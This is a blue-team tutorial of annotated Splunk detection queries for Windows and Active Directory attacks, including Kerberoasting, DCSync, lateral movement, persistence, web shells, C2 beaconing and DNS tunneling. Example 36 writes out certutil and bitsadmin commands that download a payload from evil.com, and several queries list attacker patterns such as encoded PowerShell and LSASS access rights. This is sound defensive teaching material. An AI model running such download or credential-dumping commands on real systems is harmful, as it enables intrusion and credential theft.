---
title: "Intermediate"
weight: 10000002
date: 2026-05-21T00:00:00+07:00
draft: false
description: "Blue team intermediate examples — threat detection, incident triage, and detection rule writing (Examples 29–57)"
tags: ["blue-team", "intermediate", "by-example"]
---

This section covers 29 intermediate blue team examples focused on Active Directory attack detection, lateral movement, persistence, exfiltration, and detection engineering. Each example includes an annotated query, log, or playbook step drawn from realistic SOC and incident-response scenarios.

## Example 29: Detecting Pass-the-Hash — Windows Event ID 4624 LogonType 3 with NTLMv2 from a Workstation

**What this covers:** Pass-the-Hash (PtH) abuses a captured NTLM hash to authenticate without knowing the plaintext password. Windows records network logon attempts with Event ID 4624 and LogonType 3, and NTLMv2 from a non-domain-controller source is a reliable signal. Correlating the source IP against your asset inventory exposes workstation-originated hash relay.

**Scenario:** A tier-1 analyst notices repeated 4624 events from a workstation IP during off-hours triage and escalates for further investigation.

```splunk
index=wineventlog EventCode=4624
  LogonType=3
  AuthenticationPackageName=NTLM
| eval is_ntlmv2=if(LmPackageName="NTLM V2","yes","no")
  # => LmPackageName tells us the specific NTLM dialect used
  # => NTLMv2 from a workstation is unexpected for domain auth
| where is_ntlmv2="yes"
  # => filter to NTLMv2-only events; Kerberos would not appear here
| lookup asset_inventory ip as IpAddress OUTPUT asset_type
  # => enrich source IP against known asset types (server/workstation/DC)
| where asset_type="workstation"
  # => DCs and servers may legitimately use NTLM; workstations should not relay
| stats count by src_ip, TargetUserName, WorkstationName, _time
  # => count per source-to-target pair to spot repeated auth attempts
  # => high count from one src_ip to many targets = PtH spray
| where count > 3
  # => threshold of 3 filters noise while catching meaningful patterns
| sort - count
  # => highest counts first for analyst triage priority
```

**Key Takeaway:** NTLMv2 LogonType 3 events originating from workstations (rather than domain controllers) are a strong indicator of pass-the-hash lateral movement.

**Why It Matters:** Pass-the-Hash remains one of the most common post-exploitation techniques because it requires no plaintext credential recovery. Attackers using Mimikatz or Impacket can move laterally across an entire domain using a single captured hash. Detecting this early — before the attacker reaches a domain controller or high-value target — is critical. Most environments tolerate some NTLM for legacy reasons, making workstation-sourced NTLMv2 a high-fidelity, low-noise signal that is often underutilized.

---

## Example 30: Detecting Kerberoasting — Event ID 4769 TGS Requests with RC4 Encryption from Non-Service Accounts

**What this covers:** Kerberoasting requests Ticket-Granting Service (TGS) tickets for service principal names (SPNs) using the weaker RC4 cipher so the ticket can be cracked offline. Legitimate modern Kerberos negotiates AES-256 (etype 17/18); a sudden burst of RC4 (etype 23) requests from a regular user account is the detection pivot. Event ID 4769 with FailureCode 0x0 records every successful TGS issuance.

**Scenario:** The threat-hunting team baselining Kerberos events notices a single user account requested TGS tickets for 40 different SPNs within two minutes using RC4.

```splunk
index=wineventlog EventCode=4769
  TicketOptions=0x40810000
  TicketEncryptionType=0x17
  # => EncType 0x17 = RC4-HMAC; legitimate clients request AES (0x11 or 0x12)
  Status=0x0
  # => Status 0x0 = success; failed requests are noise for this hunt
| where NOT match(ServiceName, "^krbtgt")
  # => exclude krbtgt TGS (normal AS-REP traffic); we want SPN tickets
  # => krbtgt requests indicate golden/silver ticket activity — separate hunt
| stats count as tgs_count, dc(ServiceName) as unique_spns
    by AccountName, IpAddress, _time span=5m
  # => bucket into 5-minute windows to catch burst patterns
  # => dc(ServiceName) counts distinct SPNs requested in each window
| where unique_spns > 5
  # => >5 distinct SPNs in 5 min is unusual for a human; service accounts are excluded by etype filter
  # => automated tooling (Rubeus, Invoke-Kerberoast) requests many SPNs quickly
| sort - unique_spns
```

**Key Takeaway:** A non-service account requesting multiple RC4-encrypted TGS tickets in a short window is the defining signature of Kerberoasting; AES enforcement through group policy eliminates most of this attack surface.

**Why It Matters:** Kerberoasting is entirely passive from the network perspective — the attacker only requests legitimate Kerberos tickets and cracks them offline. Without SIEM detection on Event ID 4769 with etype filtering, the attack is invisible until the cracked credential is used. Service accounts often hold excessive privileges and have passwords that were set years ago, making them high-value targets. Early detection before offline cracking succeeds can prevent full domain compromise.

---

## Example 31: Detecting AS-REP Roasting — Event ID 4768 with Pre-Authentication Disabled

**What this covers:** AS-REP Roasting targets accounts where Kerberos pre-authentication is disabled (`DONT_REQUIRE_PREAUTH` in userAccountControl). An attacker can request an AS-REP for any such account without credentials, and the response includes material encrypted with the account's password hash for offline cracking. Event ID 4768 records all Authentication Service requests, and etype 23 (RC4) without a pre-auth timestamp is the key indicator.

**Scenario:** An incident responder hunting after a phishing alert searches for accounts that do not require pre-authentication and correlates them against 4768 events from unusual source IPs.

```splunk
index=wineventlog EventCode=4768
  PreAuthType=0
  # => PreAuthType 0 = no pre-authentication supplied by client
  # => legitimate Kerberos always sends pre-auth (usually type 2 = encrypted timestamp)
| where TicketEncryptionType=0x17
  # => RC4 (0x17) indicates the client requested a crackable ticket
  # => AES (0x11/0x12) AS-REPs are harder to crack; RC4 is the attack preference
| lookup disabled_preauth_accounts SamAccountName as AccountName OUTPUT confirmed
  # => cross-reference against known DONT_REQUIRE_PREAUTH accounts in AD
  # => accounts not in this list warrant immediate escalation
| stats count by AccountName, IpAddress, confirmed, _time
  # => group by account+IP to see if one IP targets many accounts
| eval risk=if(confirmed="no","HIGH","MEDIUM")
  # => unknown accounts with this pattern = HIGH risk
  # => known DONT_REQUIRE_PREAUTH accounts = MEDIUM (still verify the source)
| sort - risk, count
```

**Key Takeaway:** Any account with Kerberos pre-authentication disabled is permanently exposed to AS-REP Roasting; remediating the `DONT_REQUIRE_PREAUTH` flag eliminates the attack path entirely.

**Why It Matters:** Unlike Kerberoasting, AS-REP Roasting does not require any existing domain credentials — an unauthenticated attacker on the network can enumerate and exploit pre-auth-disabled accounts. Many environments accumulate these misconfigured accounts through legacy application requirements or careless AD management. Detection is straightforward because the Event ID 4768 with PreAuthType=0 is rare in healthy environments, making this a high-fidelity, low-noise alert.

---

## Example 32: Detecting DCSync — Event ID 4662 with Replication Rights from a Non-DC IP

**What this covers:** DCSync abuses Active Directory replication APIs (`DS-Replication-Get-Changes`, `DS-Replication-Get-Changes-All`) to pull password hashes for any account, including `krbtgt`, without touching LSASS. Only domain controllers should invoke these rights; a user account or workstation IP invoking them is a definitive compromise indicator. Event ID 4662 (object access on the domain object) combined with replication GUIDs fires this detection.

**Scenario:** A SOC engineer investigating a suspected domain admin compromise queries for Event ID 4662 and finds a workstation IP invoking replication rights at 2 AM.

```splunk
index=wineventlog EventCode=4662
  ObjectType="{19195a5b-6da0-11d0-afd3-00c04fd930c9}"
  # => GUID for domain object class; DCSync operates on the root domain object
| where match(Properties, "(?i)1131f6aa-9c07-11d1-f79f-00c04fc2dcd2|1131f6ab")
  # => 1131f6aa = DS-Replication-Get-Changes (DRSUAPI Guid)
  # => 1131f6ab = DS-Replication-Get-Changes-All (pulls all secrets including krbtgt)
| lookup dc_inventory ip as SubjectIpAddress OUTPUT is_dc
  # => look up whether the source IP is a known domain controller
| where NOT is_dc="true"
  # => DCs calling these APIs is normal replication; non-DCs calling them = DCSync
  # => any hit here should be treated as confirmed compromise until proven otherwise
| table _time, SubjectUserName, SubjectIpAddress, ComputerName, Properties
  # => surface who, from where, against which machine
```

**Key Takeaway:** Event ID 4662 with the DS-Replication GUIDs from any IP not belonging to a domain controller is a confirmed DCSync attack that requires immediate incident response.

**Why It Matters:** DCSync gives an attacker all domain password hashes — including `krbtgt` — without running any code on the domain controller itself, making it stealthy against endpoint-only monitoring. With the `krbtgt` hash an attacker can forge Golden Tickets for indefinite domain persistence even after password resets. Detection via 4662 is reliable but requires AD audit policy to be enabled for directory service access, which many organizations overlook.

---

## Example 33: Detecting BloodHound Enumeration — LDAP Queries with Large Result Sets from a Workstation

**What this covers:** BloodHound's SharpHound collector enumerates Active Directory objects (users, groups, GPOs, trusts, ACLs) via LDAP in bulk. The characteristic pattern is a workstation issuing dozens of large-result LDAP queries in rapid succession, covering object classes like `user`, `group`, `computer`, `groupPolicyContainer`, and `trustedDomain` within seconds. LDAP query logging (Event ID 1644 on DCs) or network-layer LDAP telemetry surfaces this.

**Scenario:** A threat hunter reviewing DC event logs notices a Windows 10 workstation that issued over 2,000 LDAP results across 15 queries in under 10 seconds.

```splunk
index=wineventlog EventCode=1644
  # => Event 1644 = "An expensive, inefficient, or long-running search" on the DC
  # => must enable LDAP query logging: Set-ItemProperty -Path "HKLM:\SYSTEM\..." -Name 15 -Value 5
| rex field=Message "Client:\s+(?<client_ip>[^\s]+)"
  # => extract the client IP from the LDAP query log message
| rex field=Message "Result Entries:\s+(?<result_count>\d+)"
  # => extract how many objects the query returned
| eval result_count=tonumber(result_count)
| where result_count > 200
  # => SharpHound routinely pulls full-domain object lists; 200+ results per query is abnormal
| lookup asset_inventory ip as client_ip OUTPUT asset_type
| where asset_type="workstation"
  # => management tools on servers may legitimately run large LDAP queries
  # => workstations almost never need bulk AD enumeration
| stats count as query_count, sum(result_count) as total_results
    by client_ip, _time span=60s
  # => bucket into 60-second windows
| where query_count > 10
  # => >10 large LDAP queries per minute is the BloodHound burst signature
| sort - total_results
```

**Key Takeaway:** A workstation executing more than ten high-volume LDAP queries per minute against a domain controller is a reliable signature of automated Active Directory enumeration tools like BloodHound.

**Why It Matters:** BloodHound enumeration typically precedes lateral movement and privilege escalation by mapping the shortest path to domain admin. Detecting it in the reconnaissance phase — before any credential abuse — allows defenders to contain the threat before significant damage occurs. Enabling LDAP query logging (often disabled by default) is essential; without it, this enumeration is entirely invisible in Windows event logs.

---

## Example 34: Detecting Lateral Movement via PsExec — Event ID 7045 Service Install Plus 4624 Logon from Source

**What this covers:** PsExec creates a named-pipe service (`PSEXESVC`) on the target host to execute commands remotely. This generates Event ID 7045 (new service installed) on the target and Event ID 4624 (LogonType 3) on the same host in close temporal proximity, both originating from the same source machine. Correlating these two event IDs within a short time window produces a high-fidelity detection.

**Scenario:** A detection engineer builds a correlation search to catch PsExec-style lateral movement by joining service creation with network logon events on the same target within 30 seconds.

```splunk
index=wineventlog EventCode=7045
  ServiceFileName="*\\PSEXESVC*" OR ServiceName="PSEXESVC"
  # => PSEXESVC is the canonical PsExec service name; also check custom-named variants
  # => attackers sometimes rename the service (e.g., svc_abc) — widen with path heuristics
| eval target_host=Computer, service_time=_time
  # => capture target hostname and creation timestamp for join
| join target_host type=inner
    [search index=wineventlog EventCode=4624 LogonType=3
     | eval target_host=Computer, logon_time=_time]
  # => inner join on the same target host
  # => LogonType 3 = network logon (PsExec authenticates over the network)
| where abs(logon_time - service_time) < 30
  # => require both events within 30 seconds of each other
  # => tight window reduces false positives from unrelated logons
| table _time, target_host, src_ip, AccountName, ServiceName, ServiceFileName
  # => surface the timeline, target, source IP, and installing account
```

**Key Takeaway:** Correlating a new PSEXESVC service install (Event 7045) with a network logon (Event 4624 LogonType 3) on the same host within 30 seconds is a reliable PsExec lateral movement signature.

**Why It Matters:** PsExec and its clones (PAExec, RemCom, Impacket's psexec.py) are among the most frequently observed lateral movement tools in ransomware intrusions. The detection is robust because it requires two independent event types to co-occur, which dramatically reduces false positives compared to monitoring either event alone. Defenders should also monitor for custom-named service binaries dropped to `C:\Windows\` or `C:\Windows\Temp\` to catch renamed PsExec variants.

---

## Example 35: Detecting WMI Lateral Movement — Event ID 4688 wmiprvse.exe Spawning cmd.exe

**What this covers:** Windows Management Instrumentation (WMI) enables remote command execution via `Win32_Process.Create`, resulting in `wmiprvse.exe` spawning child processes on the target host. This parent-child relationship — `wmiprvse.exe` → `cmd.exe` or `powershell.exe` — is not a normal operational pattern and indicates remote WMI execution, which is used by many attack frameworks including Impacket's `wmiexec.py` and Cobalt Strike.

**Scenario:** A SOC analyst investigating a suspected Cobalt Strike beacon reviews process creation logs and finds `wmiprvse.exe` spawning interactive shells on multiple hosts.

```splunk
index=wineventlog EventCode=4688
  ParentProcessName="*wmiprvse.exe"
  # => wmiprvse.exe is the WMI Provider Host; it should spawn provider DLLs, not shells
  # => ParentProcessName requires process creation audit with command-line enabled
| where match(NewProcessName, "(?i)cmd\.exe|powershell\.exe|wscript\.exe|cscript\.exe")
  # => these interpreters launched by WMI = remote command execution
  # => wscript/cscript indicate script-based WMI payloads
| eval suspicious_cmdline=if(match(CommandLine, "(?i)-enc|-nop|bypass|IEX|downloadstring"), "yes","no")
  # => -enc / -nop / bypass = encoded/unrestricted PowerShell
  # => IEX / downloadstring = in-memory download-and-execute pattern
| stats count by Computer, SubjectUserName, NewProcessName, CommandLine, suspicious_cmdline
  # => aggregate by host and user to see scope of lateral movement
| sort - suspicious_cmdline, count
  # => prioritize encoded/obfuscated commands; count shows spread
```

**Key Takeaway:** `wmiprvse.exe` spawning a command interpreter is a near-definitive indicator of WMI-based remote code execution; legitimate WMI providers do not spawn interactive shells.

**Why It Matters:** WMI lateral movement is "fileless" — no binary drops to disk on the attacker's side — and uses a built-in Windows protocol, making it difficult to block without breaking legitimate management workflows. It leaves no PsExec-style service artifacts, and many organizations do not audit `wmiprvse.exe` child processes. Enabling command-line logging for Event ID 4688 and monitoring for WMI-spawned interpreters is one of the highest-value detections for advanced intrusions.

---

## Example 36: Detecting LOLBin Abuse — certutil.exe or bitsadmin.exe Downloading from an External URL

**What this covers:** Living-off-the-land binaries (LOLBins) are signed Microsoft executables repurposed for malicious activity. `certutil.exe -urlcache -split -f` and `bitsadmin /transfer` both download arbitrary files from URLs and are commonly used to stage malware payloads or retrieve second-stage implants. Monitoring command-line arguments for HTTP/HTTPS URLs in these processes catches this technique.

**Scenario:** An EDR alert flags `certutil.exe` running with an external URL argument on a finance workstation. The analyst pivots to the SIEM to assess the scope.

```splunk
index=wineventlog EventCode=4688
| where match(NewProcessName, "(?i)certutil\.exe|bitsadmin\.exe")
  # => certutil and bitsadmin are both signed Windows binaries — never blocked by AV
| where match(CommandLine, "(?i)http[s]?://")
  # => any HTTP/HTTPS argument is suspicious for these tools
  # => certutil: certutil -urlcache -split -f https://evil.com/payload.exe
  # => bitsadmin: bitsadmin /transfer job /download /priority fg https://evil.com/payload.exe
| rex field=CommandLine "(?i)(https?://[^\s\"']+)" as downloaded_url
  # => extract the specific URL for threat intelligence enrichment
| lookup threat_intel_urls url as downloaded_url OUTPUT malicious, category
  # => check URL against TI feed (e.g., MISP, OTX, URLhaus)
| eval risk=case(
    malicious="yes","CRITICAL",          # => known-bad URL = immediate escalation
    match(downloaded_url,"(?i)\.(exe|dll|ps1|bat|vbs)"),"HIGH",  # => executable extension
    true(),"MEDIUM")                     # => unknown URL + LOLBin = still investigate
| table _time, Computer, SubjectUserName, NewProcessName, CommandLine, downloaded_url, risk
| sort - risk
```

**Key Takeaway:** `certutil.exe` and `bitsadmin.exe` with HTTP/HTTPS arguments indicate payload staging; the downloaded URL should be immediately enriched against threat intelligence feeds.

**Why It Matters:** LOLBin abuse is a staple of commodity malware and sophisticated threat actors alike because these signed binaries bypass application allowlisting and are rarely monitored. `certutil.exe` in particular is so widely abused for download that Microsoft added a partial mitigation in recent Windows versions, but the technique remains viable in many environments. Command-line logging for Event ID 4688 is the primary detection requirement — without it, this activity is completely invisible.

---

## Example 37: Detecting LSASS Access — Sysmon Event ID 10 on lsass.exe from an Unusual Process

**What this covers:** Credential dumping tools (Mimikatz, ProcDump, custom loaders) read `lsass.exe` memory to extract plaintext passwords and hashes. Sysmon Event ID 10 (`ProcessAccess`) records when one process opens a handle to another, including the access rights requested. Access to `lsass.exe` with `PROCESS_VM_READ` (0x10) from any process other than known system utilities is a strong credential-theft indicator.

**Scenario:** A Sysmon-enriched SIEM detects `rundll32.exe` opening lsass with read-memory rights — a pattern consistent with a reflectively loaded credential dumper.

```splunk
index=sysmon EventCode=10
  TargetImage="*\\lsass.exe"
  # => any process accessing lsass is potentially dumping credentials
| where match(GrantedAccess, "0x1010|0x1410|0x143a|0x1fffff|0x40|0x1000")
  # => 0x1010 = PROCESS_VM_READ + PROCESS_QUERY_INFO (Mimikatz typical)
  # => 0x143a = full access for full-dump (ProcDump, Task Manager)
  # => 0x1fffff = PROCESS_ALL_ACCESS (very suspicious)
| lookup known_lsass_readers process as SourceImage OUTPUT legitimate
  # => allowlist: lsass.exe itself, svchost.exe, antivirus engines, EDR agents
  # => any process not in this list should be investigated
| where NOT legitimate="yes"
  # => filter known legitimate readers to reduce alert fatigue
| eval dump_method=case(
    match(SourceImage,"(?i)procdump"),"ProcDump",         # => signed Sysinternals tool
    match(SourceImage,"(?i)rundll32|comsvcs"),"Comsvcs",  # => comsvcs.dll MiniDump technique
    match(SourceImage,"(?i)werfault"),"WerFault abuse",   # => silent dump via crash reporting
    true(),"Unknown/Custom")
  # => categorize the likely technique for triage context
| table _time, Computer, SourceImage, SourceProcessId, GrantedAccess, dump_method
```

**Key Takeaway:** Sysmon Event ID 10 targeting `lsass.exe` with memory-read access rights from a non-whitelisted process is one of the highest-fidelity detections for credential dumping in Windows environments.

**Why It Matters:** Credential dumping from LSASS is the single most impactful post-exploitation step an attacker can take — it often yields domain admin credentials, enabling full environment compromise in minutes. While EDR tools typically block or alert on this directly, SIEM-based Sysmon detection provides a complementary layer that is harder to bypass with commercial EDR evasion techniques. Running Windows Credential Guard significantly limits what an attacker can extract from LSASS even when access succeeds.

---

## Example 38: Detecting Persistence via Registry Run Key — Sysmon Event ID 13 Registry Set in HKCU\Run

**What this covers:** Attackers achieve persistence by writing executable paths to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, which causes the binary to execute at every user logon. Sysmon Event ID 13 (`RegistryEvent — Value Set`) fires whenever a registry value is written, including the data written. Monitoring for writes to Run and RunOnce keys from suspicious processes catches this technique.

**Scenario:** An analyst reviewing Sysmon logs post-phishing incident finds `mshta.exe` adding a VBScript URL to the Run key — a JavaScript dropper persistence mechanism.

```splunk
index=sysmon EventCode=13
| where match(TargetObject,
    "(?i)\\CurrentVersion\\Run|\\CurrentVersion\\RunOnce|\\CurrentVersion\\RunServices")
  # => Run = execute at logon; RunOnce = execute once at next logon then delete
  # => RunServices = deprecated but still abused on older systems
| where NOT match(Details, "(?i)OneDrive|Teams|Slack|Zoom|Dropbox|Spotify")
  # => allowlist common legitimate autorun applications to reduce noise
  # => this list should be tuned to your environment's standard software
| eval suspicious_value=case(
    match(Details, "(?i)\.vbs|\.js|\.hta|\.wsf"), "Script extension",
    # => scripts in Run keys are unusual; legit software uses .exe
    match(Details, "(?i)%temp%|%appdata%|\\Users\\.*\\AppData"), "Temp/AppData path",
    # => malware often persists from user-writable temp locations
    match(Details, "(?i)powershell|cmd\.exe|wscript|mshta|regsvr32"), "LOLBin",
    # => Run keys invoking interpreters indicate fileless persistence
    true(), "Review")
| stats count by Computer, Image, TargetObject, Details, suspicious_value
  # => Image = the process that wrote the key; suspicious if not an installer
| where NOT suspicious_value="Review" OR count > 3
  # => surface definite hits + repeated writes of borderline entries
| sort - suspicious_value
```

**Key Takeaway:** Writes to Registry Run keys from processes other than legitimate installers — especially those using script extensions, temp paths, or interpreter binaries — indicate persistence installation that requires immediate investigation.

**Why It Matters:** Registry Run keys are one of the oldest and most frequently used persistence mechanisms because they survive reboots, are easy to implement, and are present in every Windows version. While sophisticated attackers increasingly prefer stealthier techniques (WMI subscriptions, COM hijacking), Run keys remain extremely common in commodity malware, ransomware droppers, and red team toolkits. Sysmon Event ID 13 provides the necessary visibility, but requires Sysmon to be deployed and the registry monitoring configuration to cover Run key paths.

---

## Example 39: Detecting Scheduled Task Persistence — Event ID 4698 New Scheduled Task Creation

**What this covers:** Windows Task Scheduler is a common persistence mechanism — an attacker creates a scheduled task to execute a payload at login, startup, or on a recurring schedule. Event ID 4698 fires whenever a new scheduled task is registered. The task XML embedded in the event contains the command, trigger, and registered user, all of which feed into detection logic.

**Scenario:** A SOC analyst triaging a compromised workstation reviews Event ID 4698 logs and finds a base64-encoded PowerShell command registered as a task named `MicrosoftEdgeUpdate` to masquerade as a legitimate Microsoft task.

```splunk
index=wineventlog EventCode=4698
  # => Event 4698 = A scheduled task was created
| rex field=Message "Task Name:\s+(?<task_name>[^\r\n]+)" maxmatch=1
  # => extract the task name from the message body
| rex field=Message "<Command>(?<task_command>[^<]+)</Command>" maxmatch=1
  # => extract the command element from the embedded XML
| rex field=Message "<Arguments>(?<task_args>[^<]+)</Arguments>" maxmatch=1
  # => extract arguments (may contain encoded PowerShell or URLs)
| eval encoded=if(match(task_args, "(?i)-enc|-EncodedCommand|[A-Za-z0-9+/]{50,}=*"), "yes","no")
  # => base64 length heuristic: >50 contiguous base64 chars in args = encoded payload
| eval masquerade=if(match(task_name, "(?i)Microsoft|Windows|Update|Defender|Edge"), "yes","no")
  # => attackers often name tasks after legitimate Windows components to blend in
| where encoded="yes" OR match(task_command, "(?i)powershell|cmd|wscript|mshta|regsvr32")
  # => focus on tasks running interpreters or encoded payloads
| table _time, Computer, SubjectUserName, task_name, task_command, task_args, encoded, masquerade
| sort - encoded, masquerade
  # => encoded + masquerade combination = highest priority
```

**Key Takeaway:** Scheduled tasks with encoded command arguments or names mimicking Microsoft components are high-confidence persistence indicators that should be correlated with the creating user account's activity timeline.

**Why It Matters:** Scheduled tasks bypass many endpoint security controls because Task Scheduler is a signed, privileged Windows component. The event log embeds the full task XML including the command and trigger, providing rich forensic context without requiring additional tooling. Defenders should correlate 4698 events with 4624 logon events and process creation logs to build a complete picture of what the attacker executed before registering the task.

---

## Example 40: Detecting WMI Subscription Persistence — Event ID 5858/5860 WMI Activity Plus MOF Filter

**What this covers:** WMI event subscriptions create persistent "tripwires" that execute payloads when system events occur (logon, process creation, USB insertion). This mechanism survives reboots and is invisible to most endpoint tools. Event IDs 5858 and 5860 in the `Microsoft-Windows-WMI-Activity/Operational` log record WMI operations; the subscription artifacts also appear as new objects in the `root\subscription` WMI namespace, which can be captured via Sysmon or specialized tooling.

**Scenario:** A forensic analyst examining a compromised server finds a WMI event filter named `BVUpdater` with a consumer that launches PowerShell on every system startup.

```splunk
index=sysmon EventCode=20 OR EventCode=21
  # => Sysmon Event 20 = WmiEventFilter activity detected
  # => Sysmon Event 21 = WmiEventConsumer activity detected
| eval component=case(EventCode=20, "Filter", EventCode=21, "Consumer", true(), "Unknown")
  # => filters define what event triggers the subscription
  # => consumers define what action executes when the filter fires
| rex field=Message "Name:\s+(?<wmi_name>[^\r\n]+)"
  # => extract the filter or consumer name; malware uses generic-sounding names
| eval suspicious_name=if(
    match(wmi_name, "(?i)update|system|windows|service|microsoft"), "masquerade","custom")
  # => masquerade names blend with legitimate WMI objects
| join wmi_name type=left
    [search index=sysmon EventCode=22
     | rex field=Message "Consumer:\s+(?<wmi_name>[^\r\n]+)"
     | rex field=Message "Filter:\s+(?<filter_ref>[^\r\n]+)"]
  # => Event 22 = WmiEventConsumerToFilter binding — the activation link
  # => joining filter + consumer + binding shows the complete persistence mechanism
| where component="Consumer"
  # => the consumer (executor) is the critical artifact — surface all consumers
| rex field=Message "(?i)command[^:]*:\s+(?<payload>[^\r\n]+)"
  # => extract the command the consumer will execute
| table _time, Computer, wmi_name, payload, suspicious_name, filter_ref
```

**Key Takeaway:** WMI event subscriptions require three components (filter + consumer + binding) to persist; detecting any new consumer object, especially with interpreter or download payloads, indicates WMI-based persistence.

**Why It Matters:** WMI subscriptions are one of the most stealthy persistence mechanisms available on Windows — they require no new files on disk, survive reboots without registry entries, and are not visible in standard autoruns tools unless WMI-aware. APT groups including APT29 and FIN7 have used WMI subscriptions for long-term persistence in high-value environments. Sysmon's WMI event IDs (19, 20, 21) are the most reliable detection source and should be enabled in all Sysmon configurations used for threat detection.

---

## Example 41: Detecting Web Shell Upload — Web Log POST to /uploads/\*.php with 200 Response

**What this covers:** Web shells are malicious scripts uploaded to a web server that provide remote code execution through HTTP requests. The upload phase typically appears as a POST request to a file-upload endpoint returning HTTP 200, followed by GET or POST requests to the uploaded PHP (or ASPX, JSP) file — often with unusual query parameters that act as commands. Correlating these two patterns in web access logs identifies web shell deployment and activation.

**Scenario:** An analyst reviewing IIS access logs after a vulnerability alert finds a POST to `/uploads/img_resize.php` returning 200, followed immediately by requests to the same file with `cmd=whoami` style parameters.

```splunk
index=web_logs
| eval is_upload=if(method="POST" AND match(uri_path, "(?i)/uploads/.*\.(php|aspx|jsp|jspx|phtml)") AND status=200, "yes","no")
  # => POST to writable upload directory with script extension + 200 = successful upload
  # => 403/500 responses indicate blocked or failed upload attempts
| eval is_activation=if(match(uri_path, "(?i)/uploads/.*\.(php|aspx|jsp)") AND method="GET" AND match(uri_query, "(?i)cmd|exec|shell|passwd|id=|run="), "yes","no")
  # => GET to uploaded script with shell-command parameters = web shell execution
  # => common parameter names vary by web shell family (c99, b374k, China Chopper)
| stats values(method) as methods, values(status) as statuses,
         max(is_upload) as had_upload, max(is_activation) as had_activation
         by src_ip, uri_path, _time span=10m
  # => correlate upload and activation events from same IP within 10 minutes
| where had_upload="yes" AND had_activation="yes"
  # => require BOTH events to reduce false positives from legitimate file uploads
  # => single-event hits still worth reviewing but lower priority
| lookup geoip src_ip OUTPUT country_name
  # => enrich source IP with geolocation for analyst context
| table _time, src_ip, country_name, uri_path, methods, statuses
```

**Key Takeaway:** Correlating a successful script file upload with subsequent HTTP requests to that same file containing command-execution parameters is a definitive web shell deployment and activation signature.

**Why It Matters:** Web shells are the most common initial access persistence mechanism after web application exploitation because they are simple, reliable, and hard to detect once installed. A single missed alert can result in months of undetected access. Defenders should additionally monitor for new PHP/ASPX files created in web-accessible directories (file integrity monitoring), unusual outbound connections from the web server process, and commands spawned by the web server user account (e.g., `www-data`, `IIS APPPOOL`).

---

## Example 42: Detecting C2 Beaconing — Periodic Outbound Connections at Fixed Intervals to the Same IP

**What this covers:** Command-and-control (C2) implants "phone home" on a regular schedule to check for operator commands — a pattern called beaconing. The statistical signature is a small standard deviation in inter-connection intervals from a single internal host to a single external IP, often on common ports (80, 443, 8080). Calculating the coefficient of variation (CV = stddev/mean) on connection intervals distinguishes mechanical beaconing from human browsing patterns.

**Scenario:** A network security analyst reviewing NetFlow data notices a workstation making exactly 47 outbound TCP connections to `185.220.101.42:443` spaced almost exactly 60 seconds apart over a 48-hour period.

```splunk
index=network_flows dest_port IN (80,443,8080,8443,4444,1234)
  direction="outbound"
| eval hour_of_day=strftime(_time, "%H")
  # => used later to check if beaconing spans sleep hours (unusual for humans)
| bucket _time span=1s
  # => reduce sub-second duplicate flows from session state reporting
| streamstats window=100 current=f by src_ip, dest_ip
    global=false earliest(_time) as prev_time
  # => track the timestamp of the previous connection in the same src→dest stream
| eval interval=_time - prev_time
  # => time gap between consecutive connections to the same destination
| stats avg(interval) as avg_interval, stdev(interval) as stddev_interval,
         count as connection_count
         by src_ip, dest_ip, dest_port
  # => aggregate statistics across the full observation window
| where connection_count > 10
  # => need enough data points for meaningful statistics
| eval cv=stddev_interval / avg_interval
  # => coefficient of variation: low CV = highly regular timing = beacon
  # => CV < 0.3 is characteristic of automated beaconing
| where cv < 0.3 AND avg_interval BETWEEN 30 AND 3600
  # => 30s–1h average intervals cover most common beacon frequencies
  # => very short (<30s) or very long (>1h) intervals still worth hunting separately
| lookup threat_intel_ips ip as dest_ip OUTPUT malicious
| sort cv
  # => lowest CV first = most clock-like = highest confidence beacon
```

**Key Takeaway:** A coefficient of variation below 0.3 on outbound connection intervals to a single external IP is the mathematical fingerprint of automated C2 beaconing, distinguishing it from irregular human web browsing.

**Why It Matters:** Most C2 frameworks (Cobalt Strike, Metasploit Meterpreter, Sliver, Havoc) default to configurable beacon intervals with optional jitter. Without jitter — or with insufficient jitter — the beaconing pattern is detectable purely through timing statistics without any knowledge of the C2 protocol or payload. This detection works over encrypted HTTPS because it operates at the NetFlow level, making it effective against TLS-encrypted C2 channels that evade payload-inspection approaches.

---

## Example 43: Detecting DNS Tunneling — Abnormally Long DNS Query Names or High Query Volume

**What this covers:** DNS tunneling encodes data within DNS query names or TXT record responses to exfiltrate data or run a covert C2 channel over DNS, which is rarely blocked at network egress. The signature is unusually long subdomain labels (legitimate FQDNs rarely exceed 30 characters in the left-most label), abnormally high unique-query volume per host, or entropy patterns inconsistent with human-readable domain names.

**Scenario:** A network analyst reviewing DNS logs notices a host generating 3,000 unique DNS queries per hour, all to subdomains of `c2tunnel.net`, with query names averaging 55 characters of random-looking hex strings.

```splunk
index=dns_logs query_type="A" OR query_type="TXT" OR query_type="CNAME"
| rex field=query "^(?<subdomain>[^.]+)\.(?<domain>[^.]+\.[^.]+)$"
  # => extract the leftmost label (subdomain) and the registered domain
  # => DNS tunneling data lives in the subdomain portion
| eval subdomain_len=len(subdomain)
  # => long subdomains encode data: base64 or hex of the payload chunk
| eval entropy=0
  # => entropy calculation approximation via character diversity
| eval char_ratio=round((len(replace(lower(subdomain),"[^a-z]","")) / subdomain_len),2)
  # => ratio of alpha chars; hex-encoded data is 50% non-alpha (digits)
  # => base64-encoded data has ~75% alpha; human domain labels are ~95%+ alpha
| where subdomain_len > 40 OR char_ratio < 0.7
  # => subdomain >40 chars OR low alpha ratio = likely encoded data
| stats count as query_count, dc(query) as unique_queries, avg(subdomain_len) as avg_len
    by src_ip, domain, _time span=1h
  # => aggregate per source host per registered domain per hour
| where query_count > 100 OR unique_queries > 50
  # => volume threshold: legitimate domains rarely generate this many unique subdomains
  # => 100 queries/hr to one domain = automated tool, not human browsing
| lookup threat_intel_domains domain OUTPUT malicious, category
| sort - unique_queries
```

**Key Takeaway:** DNS queries with subdomain labels exceeding 40 characters combined with high unique-query volume to a single registered domain are strong indicators of DNS tunneling for data exfiltration or covert C2.

**Why It Matters:** DNS is allowed outbound in virtually every network because it is required for normal operation, making it an attractive exfiltration channel. Tools like `iodine`, `dns2tcp`, and custom C2 frameworks use DNS tunneling as a firewall bypass technique. Detection at the DNS resolver or through DNS query logging provides coverage that network firewalls cannot supply. Blocking recursive DNS resolution to non-approved resolvers and implementing DNS-over-HTTPS monitoring are complementary controls.

---

